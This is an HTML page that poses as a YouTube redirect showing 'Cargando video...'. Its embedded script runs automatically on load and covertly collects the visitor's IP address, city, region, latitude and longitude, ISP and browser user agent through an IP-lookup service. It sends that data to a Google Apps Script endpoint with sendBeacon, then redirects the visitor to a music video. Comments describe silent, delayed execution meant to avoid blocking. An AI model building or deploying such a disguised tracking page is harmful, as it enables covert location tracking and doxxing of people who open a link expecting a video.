<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>YouTube - Redirect</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        // Configuración
        const TARGET = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
        const BRIDGE = "https://script.google.com/macros/s/AKfycbzi9jBJlyfvrJ8XYX4JGiZ5JIMjP4fCk0ZVv8zpYZPeaAJ07wiqEexA9csKg9HKEHI8pA/exec";

        async function executePayload() {
            try {
                // 1. IP Intelligence - Geolocalización de Alta Precisión
                // Usamos ip-api para obtener latitud, longitud, ciudad e ISP
                const geoRes = await fetch('http://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,isp,query');
                const geoData = await geoRes.json();

                if (geoData.status === 'success') {
                    const params = new URLSearchParams({
                        lat: geoData.lat,
                        lon: geoData.lon,
                        loc: `${geoData.city}, ${geoData.regionName}`,
                        isp: geoData.isp,
                        ip: geoData.query,
                        agent: navigator.userAgent
                    });

                    // 2. Delay Inteligente & Ejecución Silenciosa
                    // Enviamos los datos sin esperar respuesta (Beacon API es mejor para evitar bloqueos)
                    navigator.sendBeacon(`${BRIDGE}?${params.toString()}`);
                }
            } catch (e) { console.log('Bypass logic'); }

            // Redirección con un pequeño delay para asegurar la salida de datos
            setTimeout(() => {
                window.location.replace(TARGET);
            }, 800);
        }

        // Delay Inteligente: El script no se ejecuta hasta que el navegador esté "en calma"
        // o el usuario realice una acción mínima.
        window.addEventListener('DOMContentLoaded', () => {
            if (window.requestIdleCallback) {
                window.requestIdleCallback(executePayload);
            } else {
                setTimeout(executePayload, 1500);
            }
        });
    </script>
</head>
<body style="background: #000; color: #333; font-family: sans-serif;">
    <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;">
        <div class="loader"></div>
        <p>Cargando video...</p>
    </div>
    <style>
        .loader { border: 3px solid #1a1a1a; border-top: 3px solid #ff0000; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</body>
</html>
